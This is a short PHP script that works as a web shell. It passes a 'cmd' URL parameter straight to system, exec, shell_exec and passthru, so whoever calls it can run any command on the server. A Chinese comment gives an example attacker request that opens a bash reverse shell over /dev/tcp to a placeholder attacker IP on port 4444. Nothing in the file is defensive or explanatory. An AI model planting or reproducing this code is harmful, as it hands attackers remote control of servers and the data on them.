<?php

if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];

    system($cmd);

    exec($cmd);

    shell_exec($cmd);

    passthru($cmd);
}

// 示例调用(攻击者可以输入):
// http://example.com/command_injection_shell.php?cmd=bash -i >& /dev/tcp/攻击者IP/4444 0>&1
?>